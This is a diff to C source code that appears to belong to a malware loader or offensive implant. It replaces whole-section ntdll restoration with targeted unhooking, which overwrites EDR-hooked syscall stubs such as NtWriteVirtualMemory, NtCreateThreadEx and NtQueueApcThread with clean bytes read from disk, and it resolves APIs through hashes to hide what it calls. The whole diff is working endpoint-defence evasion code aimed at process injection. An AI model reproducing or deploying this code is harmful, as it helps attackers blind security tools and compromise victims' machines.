@@ -302,6 +302,18 @@ static void _derive_key(const unsigned char *seed, unsigned int seedlen,
 #define H_NtProtectVirtualMemory    0x1AF70505
 #define H_NtFreeVirtualMemory       0xD780C6BE
 
+/* Nt* hashes for targeted unhooking — common EDR-hooked syscalls */
+#define H_NtWriteVirtualMemory      0x6BFAF34A
+#define H_NtCreateThreadEx          0x622557AD
+#define H_NtMapViewOfSection        0x264EBEE4
+#define H_NtOpenProcess             0x472594B2
+#define H_NtQueueApcThread          0x62744EA3
+#define H_NtReadVirtualMemory       0x157FF6A0
+#define H_NtResumeThread            0x6C37B31E
+#define H_NtCreateSection           0x8C0F55BA
+#define H_NtOpenThread              0x121303C4
+#define H_NtUnmapViewOfSection      0x70A2530C
+
 /* Unhooking API hashes — ntdll clean-copy restoration */
 #define H_CreateFileMappingA        0xA1C573C3
 #define H_MapViewOfFile             0x447430C9
@@ -442,6 +454,29 @@ typedef HANDLE (WINAPI *fnCreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, D
 typedef LPVOID (WINAPI *fnMapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
 typedef BOOL   (WINAPI *fnUnmapViewOfFile_t)(LPCVOID);
 
+/* Convert RVA to file offset using section table */
+static DWORD _rva_to_offset(IMAGE_SECTION_HEADER *secs, WORD nSecs, DWORD rva) {
+    for (WORD i = 0; i < nSecs; i++) {
+        DWORD va  = secs[i].VirtualAddress;
+        DWORD vsz = secs[i].Misc.VirtualSize;
+        if (rva >= va && rva < va + vsz)
+            return secs[i].PointerToRawData + (rva - va);
+    }
+    return 0;
+}
+
+/* Targeted ntdll unhooking — restore individual syscall stubs only.
+ *
+ * Full .text replacement can break things: Windows applies in-memory
+ * hotfixes to ntdll that differ from the on-disk copy.  Overwriting
+ * ALL of .text reverts those patches and silently corrupts networking
+ * or CRT functions.
+ *
+ * Instead we patch only the specific Nt* syscall stubs that EDRs hook.
+ * Each stub is ~32 bytes; the rest of ntdll (including hotfixes) stays
+ * untouched. */
+#define STUB_PATCH_SIZE 32   /* bytes to restore per syscall stub */
+
 static void _unhook_ntdll(BYTE *k32, BYTE *ntdll_base) {
     /* Resolve file mapping APIs from kernel32 */
     fnCreateFileA_u_t pCreateFileA = (fnCreateFileA_u_t)_resolve_export(k32, H_CreateFileA);
@@ -452,15 +487,16 @@ static void _unhook_ntdll(BYTE *k32, BYTE *ntdll_base) {
         (fnMapViewOfFile_t)_resolve_export(k32, H_MapViewOfFile);
     fnUnmapViewOfFile_t pUnmapViewOfFile =
         (fnUnmapViewOfFile_t)_resolve_export(k32, H_UnmapViewOfFile);
+    fnVirtualProtect_u_t pVP =
+        (fnVirtualProtect_u_t)_resolve_export(k32, H_VirtualProtect);
 
     if (!pCreateFileA || !pCloseHandle || !pCreateFileMappingA ||
-        !pMapViewOfFile || !pUnmapViewOfFile) {
-        SLOG("[stub] unhook: missing file APIs — skipped");
+        !pMapViewOfFile || !pUnmapViewOfFile || !pVP) {
+        SLOG("[stub] unhook: missing APIs — skipped");
         return;
     }
 
-    /* Open clean ntdll.dll from disk
-     * Use the KnownDlls path via System32 — guaranteed unmodified on disk */
+    /* Open clean ntdll.dll from disk */
     HANDLE hFile = pCreateFileA(
         "C:\\Windows\\System32\\ntdll.dll",
         GENERIC_READ, FILE_SHARE_READ, NULL,
@@ -487,55 +523,59 @@ static void _unhook_ntdll(BYTE *k32, BYTE *ntdll_base) {
         return;
     }
 
-    /* Parse the clean copy's PE headers to find .text section */
+    /* Parse clean copy to get section table for RVA-to-offset conversion */
     IMAGE_DOS_HEADER *cleanDos = (IMAGE_DOS_HEADER *)cleanNtdll;
     if (cleanDos->e_magic != IMAGE_DOS_SIGNATURE) goto cleanup;
-
     IMAGE_NT_HEADERS *cleanNt = (IMAGE_NT_HEADERS *)(cleanNtdll + cleanDos->e_lfanew);
     if (cleanNt->Signature != IMAGE_NT_SIGNATURE) goto cleanup;
+    IMAGE_SECTION_HEADER *cleanSec = IMAGE_FIRST_SECTION(cleanNt);
+    WORD nSecs = cleanNt->FileHeader.NumberOfSections;
 
-    /* Also parse the loaded (hooked) ntdll */
-    IMAGE_DOS_HEADER *loadedDos = (IMAGE_DOS_HEADER *)ntdll_base;
-    IMAGE_NT_HEADERS *loadedNt = (IMAGE_NT_HEADERS *)(ntdll_base + loadedDos->e_lfanew);
+    /* List of Nt* syscall stubs to unhook — covers the common EDR targets */
+    {
+        static const DWORD targets[] = {
+            H_NtAllocateVirtualMemory,
+            H_NtProtectVirtualMemory,
+            H_NtFreeVirtualMemory,
+            H_NtWriteVirtualMemory,
+            H_NtCreateThreadEx,
+            H_NtMapViewOfSection,
+            H_NtOpenProcess,
+            H_NtQueueApcThread,
+            H_NtReadVirtualMemory,
+            H_NtResumeThread,
+            H_NtCreateSection,
+            H_NtOpenThread,
+            H_NtUnmapViewOfSection,
+        };
+        DWORD patched = 0;
 
-    /* Walk sections in the loaded copy to find .text */
-    IMAGE_SECTION_HEADER *loadedSec = IMAGE_FIRST_SECTION(loadedNt);
-    IMAGE_SECTION_HEADER *cleanSec  = IMAGE_FIRST_SECTION(cleanNt);
+        for (DWORD t = 0; t < sizeof(targets)/sizeof(targets[0]); t++) {
+            /* Resolve loaded (potentially hooked) address */
+            BYTE *hooked = (BYTE *)_resolve_export(ntdll_base, targets[t]);
+            if (!hooked) continue;
 
-    for (WORD i = 0; i < loadedNt->FileHeader.NumberOfSections; i++) {
-        /* Match by name: .text */
-        if (loadedSec[i].Name[0] == '.' &&
-            loadedSec[i].Name[1] == 't' &&
-            loadedSec[i].Name[2] == 'e' &&
-            loadedSec[i].Name[3] == 'x' &&
-            loadedSec[i].Name[4] == 't')
-        {
-            /* Found .text — replace loaded (hooked) code with clean bytes.
-             * The clean copy is a flat file mapping, so we use
-             * PointerToRawData for the offset into the clean mapping,
-             * and VirtualAddress for the offset into the loaded image. */
-            BYTE *hookedText = ntdll_base + loadedSec[i].VirtualAddress;
-            BYTE *cleanText  = cleanNtdll + cleanSec[i].PointerToRawData;
-            DWORD textSize   = loadedSec[i].Misc.VirtualSize;
+            /* Compute RVA and convert to file offset */
+            DWORD rva = (DWORD)(hooked - ntdll_base);
+            DWORD fileOff = _rva_to_offset(cleanSec, nSecs, rva);
+            if (!fileOff) continue;
 
-            /* VirtualProtect the loaded .text to RWX so we can overwrite */
-            DWORD oldProtect;
-            fnVirtualProtect_u_t pVP = (fnVirtualProtect_u_t)_resolve_export(k32, H_VirtualProtect);
-            if (!pVP) break;
+            BYTE *clean = cleanNtdll + fileOff;
 
-            pVP(hookedText, textSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+            /* Check if the stub is actually hooked (first byte != 0x4C means
+             * the normal mov r10,rcx was overwritten with a JMP/etc.) */
+            if (hooked[0] == 0x4C) continue;  /* not hooked, skip */
 
-            /* Copy clean .text over hooked .text */
-            for (DWORD j = 0; j < textSize; j++)
-                hookedText[j] = cleanText[j];
-
-            /* Restore original protection */
-            pVP(hookedText, textSize, oldProtect, &oldProtect);
-
-            SLOG("[stub] unhook: ntdll .text restored");
-            SHEX("[stub] unhook: .text size", textSize);
-            break;
+            /* Patch: make writable, copy clean stub, restore */
+            DWORD oldProt;
+            pVP(hooked, STUB_PATCH_SIZE, PAGE_EXECUTE_READWRITE, &oldProt);
+            for (int b = 0; b < STUB_PATCH_SIZE; b++)
+                hooked[b] = clean[b];
+            pVP(hooked, STUB_PATCH_SIZE, oldProt, &oldProt);
+            patched++;
         }
+
+        SHEX("[stub] unhook: stubs patched", patched);
     }
 
 cleanup:
